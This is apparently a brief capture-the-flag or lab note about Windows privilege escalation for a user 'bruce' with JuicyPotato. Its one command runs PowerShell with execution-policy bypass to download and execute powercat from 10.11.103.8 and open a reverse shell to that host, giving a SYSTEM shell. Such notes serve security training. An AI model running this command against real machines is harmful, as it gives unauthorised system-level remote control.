User `bruce` has following privileges
![[Pasted image 20240816185142.png]]

Used JuicyPotato as GodPotato did not work for PrivEsc
```Powershell
JuicyPotato.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p "C:\Windows\System32\cmd.exe" -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.11.103.8/powercat.ps1');powercat -c 10.11.103.8 -p 4454 -e cmd" -t *
```

Used a different CLSID from the one used in RetroCTF as the same one did not work

Received shell as `nt authority\system`
![[Pasted image 20240816185316.png]]
